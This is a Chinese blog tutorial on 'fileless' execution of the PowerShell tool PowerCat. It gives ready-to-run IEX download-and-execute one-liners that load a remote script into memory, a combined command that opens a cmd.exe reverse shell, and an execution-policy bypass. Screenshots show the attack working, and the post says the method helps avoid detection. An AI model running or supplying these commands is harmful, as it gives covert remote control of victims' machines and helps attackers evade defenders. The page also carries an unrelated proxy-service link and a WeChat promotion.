
声明：本文主要用作技术分享，所有内容仅供参考。任何使用或依赖于本文信息所造成的法律后果均与本人无关。请读者自行判断风险，并遵循相关法律法规。


目录* [完整示例](https://github.com)
* [注意事项](https://github.com):[悠兔机场](https://xinnongbo.com)
* [演示](https://github.com)

无文件落地执行（fileless execution）是一种技术，用于避免在磁盘上留下文件痕迹，使得恶意行为更难被检测到。PowerCat 是一个基于 PowerShell 的渗透测试工具，可以使用 PowerShell 的特性实现无文件落地执行。


1. **准备 PowerCat 脚本**：将 PowerCat 的脚本托管在一个可以访问的远程服务器上，比如 GitHub Gist、Pastebin 或自建的 HTTP 服务器。
2. **使用 PowerShell 命令直接从远程服务器下载并执行脚本**：


	* 使用 `IEX`（Invoke\-Expression）和 `Invoke-WebRequest` 或 `Invoke-RestMethod` 组合可以直接在内存中加载和执行脚本。
	* 以下是一个示例命令，通过 PowerShell 从远程服务器下载并执行 PowerCat：



```
IEX (New-Object Net.WebClient).DownloadString('https://example.com/path/to/powercat.ps1')

```

或者使用 `Invoke-RestMethod`：



```
IEX (Invoke-RestMethod -Uri 'https://example.com/path/to/powercat.ps1')

```

3. **执行 PowerCat 命令**：在内存中加载 PowerCat 后，直接使用 PowerCat 提供的功能进行渗透测试。例如，使用 PowerCat 建立反向 shell：



```
powercat -c target_ip -p target_port -e cmd.exe

```

##### 完整示例


假设 PowerCat 脚本托管在 `https://example.com/path/to/powercat.ps1`：



```
IEX (New-Object Net.WebClient).DownloadString('https://example.com/path/to/powercat.ps1'); powercat -c target_ip -p target_port -e cmd.exe

```

此命令会在内存中下载并执行 PowerCat 脚本，并立即通过 PowerCat 建立反向 shell 连接。


##### 注意事项


* **安全性**：确保托管脚本的远程服务器是安全的，防止脚本被篡改。
* **权限**：PowerShell 执行策略可能会限制脚本执行。需要以管理员权限运行 PowerShell 或调整执行策略：



```
Set-ExecutionPolicy Unrestricted -Scope Process

```

* **检测和防御**：尽管无文件落地执行可以降低被检测的可能性，但仍有其他检测和防御手段，例如基于行为的检测，因此在实际渗透测试中要综合考虑多种手段。


通过这些步骤，你可以实现 PowerCat 的无文件落地执行，直接在内存中下载并执行 PowerCat 脚本。


##### 演示


远端机开启web服务，用于被控端下载powercat 脚本![](https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192238743-1288239076.png)


攻击机开启监听
![](https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192324819-2114882386.png)


执行命令
![](https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192345028-2087607265.png)


攻击端成功接收
![](https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192411316-2110326406.png)


查看被控端执行目录文件列表，不存在powercat.ps1 文件，说明文件未落地执行，直接在内存中执行。
![](https://img2024.cnblogs.com/blog/2839487/202412/2839487-20241225192430119-122322500.png)


当然除了使用 IEX 进行无文件落地，还可以使用的方法有 4 种。
欢迎关注 公众号 “D1TASec” 查看文章。


